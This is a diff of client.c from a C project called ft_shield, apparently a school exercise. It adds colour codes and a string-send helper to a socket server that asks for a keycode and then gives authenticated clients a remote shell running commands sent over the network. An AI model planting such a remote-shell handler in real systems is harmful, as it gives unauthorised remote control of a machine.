@@ -1,14 +1,3 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   client.c                                           :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2026/10/22 17:00:00 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/22 17:00:00 by zcadinot         ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
 
 #include "ft_shield.h"
 #include "daemon.h"
@@ -23,6 +12,11 @@ int cli_send(t_client *client, SOCKET socket, const char *buf, int len)
     if (sent > 0)
         client->bytes_out += sent;
     return sent;
+}
+
+int cli_send_str(t_client *client, SOCKET socket, const char *buf)
+{
+    return cli_send(client, socket, buf, (int)strlen(buf));
 }
 
 void client_reset(t_client *client, SOCKET socket)
@@ -59,13 +53,13 @@ void client_accept(SOCKET server_fd, t_client clients[], fd_set *fd_list)
     slot = find_slot(clients, INVALID_SOCKET);
     if (slot == MAX_CLIENTS)
     {
-        send(client, "Server full\n", 12, 0);
+        send(client, COLOR_RED "Server full\n" COLOR_RESET, 23, 0);
         closesocket(client);
         return ;
     }
     client_reset(&clients[slot], client);
     FD_SET(client, fd_list);
-    cli_send(&clients[slot], client, "Keycode: ", 9);
+    cli_send_str(&clients[slot], client, COLOR_YELLOW "Keycode: " COLOR_RESET);
     log_write("CONNECT");
     debug_printf("Client connected: %llu\n", (unsigned long long)client);
 }
@@ -92,12 +86,12 @@ static void handle_auth(t_client *client, SOCKET socket, const char *buffer)
     {
         client->authenticated = 1;
         log_write("AUTH OK");
-        cli_send(client, socket, "Authentication success\n$> ", 26);
+        cli_send_str(client, socket, COLOR_GREEN "Authentication success\n" COLOR_RESET "$> ");
     }
     else
     {
         log_write("AUTH FAIL");
-        cli_send(client, socket, "Wrong keycode\nKeycode: ", 23);
+        cli_send_str(client, socket, COLOR_RED "Wrong keycode\n" COLOR_RESET COLOR_YELLOW "Keycode: " COLOR_RESET);
     }
 }
 
@@ -107,18 +101,18 @@ static void handle_shell(t_client *client, SOCKET socket, const char *buffer)
     {
         cmd_stop(&client->cmd);
         client->shell_mode = 0;
-        cli_send(client, socket, "Leaving shell\n$> ", 17);
+        cli_send_str(client, socket, COLOR_CYAN "Leaving shell\n" COLOR_RESET "$> ");
         return ;
     }
     debug_printf("Shell command from %llu: %s\n",
         (unsigned long long)socket, buffer);
     log_write("SHELL: %s", buffer);
     if (!cmd_exec(&client->cmd, buffer))
-        cli_send(client, socket, "Failed to execute command\nshell> ", 33);
+        cli_send_str(client, socket, COLOR_RED "Failed to execute command\n" COLOR_RESET "shell> ");
     else if (!cmd_send_output(&client->cmd, socket))
-        cli_send(client, socket, "Failed to read command output\n", 30);
+        cli_send_str(client, socket, COLOR_RED "Failed to read command output\n" COLOR_RESET);
     else
-        cli_send(client, socket, "\nshell> ", 8);
+        cli_send_str(client, socket, "\nshell> ");
 }
 
 static void handle_stats(t_client *client, SOCKET socket)
@@ -139,17 +133,17 @@ static void handle_shell_start(t_client *client, SOCKET socket)
     {
         debug_printf("Client %llu: failed to start shell\n",
             (unsigned long long)socket);
-        cli_send(client, socket, "Shell failed to start\n$> ", 25);
+        cli_send_str(client, socket, COLOR_RED "Shell failed to start\n" COLOR_RESET "$> ");
         return ;
     }
     client->shell_mode = 1;
-    cli_send(client, socket, "Shell started\nshell> ", 21);
+    cli_send_str(client, socket, COLOR_CYAN "Shell started\n" COLOR_RESET "shell> ");
 }
 
 static void handle_command(t_client *client, SOCKET socket, const char *buffer)
 {
     if (strcmp(buffer, "?") == 0)
-        cli_send(client, socket, help_message(), (int)strlen(help_message()));
+        cli_send_str(client, socket, help_message());
     else if (strcmp(buffer, "stats") == 0)
         handle_stats(client, socket);
     else if (strcmp(buffer, "shell") == 0)
@@ -158,7 +152,7 @@ static void handle_command(t_client *client, SOCKET socket, const char *buffer)
     {
         debug_printf("Client %llu: %s\n", (unsigned long long)socket, buffer);
         log_write("CMD: %s", buffer);
-        cli_send(client, socket, "Message received\n$> ", 20);
+        cli_send_str(client, socket, "Message received\n$> ");
     }
 }
 
